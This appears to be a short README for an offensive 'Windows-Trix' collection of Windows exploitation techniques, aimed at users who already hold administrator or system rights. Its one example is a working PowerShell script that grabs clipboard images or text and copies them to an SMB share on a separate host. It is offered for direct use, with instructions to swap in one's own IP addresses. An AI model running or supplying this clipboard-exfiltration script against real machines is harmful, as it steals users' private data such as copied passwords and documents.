# Windows-Trix
An assortment of techniques that can be used to exploit Windows.  Most of these assume that you have or can attain administrator or system privileges on the endpoint.  You will need to change IP addresses and other references in the examples to fit your environment.

## Copying data from the clipboard using powershell

```powershell
Add-Type -AssemblyName System.Windows.Forms

if($([System.Windows.Forms.Clipboard]::ContainsImage()))
{
   $cb = [System.Windows.Forms.Clipboard]::GetImage()
   $file = '\\10.192.103.49\smbdata\clipboard.png'
   $cb.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
}
else
{
   if($([System.Windows.Forms.Clipboard]::ContainsText()))
   {
      $cb = [System.Windows.Forms.Clipboard]::GetText()
      $file = '\\10.192.103.49\smbdata\clipboard.txt'
      $cb > $file
   }
   else
   {
      Write-Output "Nothing in clipboard to save."
   }
}
```
